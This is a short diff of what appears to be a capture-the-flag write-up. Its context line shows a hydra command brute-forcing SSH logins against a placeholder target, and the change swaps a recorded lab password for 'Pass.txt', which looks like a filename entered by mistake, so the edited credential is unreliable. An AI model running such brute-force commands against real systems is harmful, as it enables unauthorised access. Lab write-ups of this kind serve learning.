@@ -170,7 +170,7 @@ hydra -L users.txt -P pass.txt <target_ip> ssh
 
 Valid creds:
 ```
-overflow : Good_job_:)
+overflow : Pass.txt
 ```
 
 ---
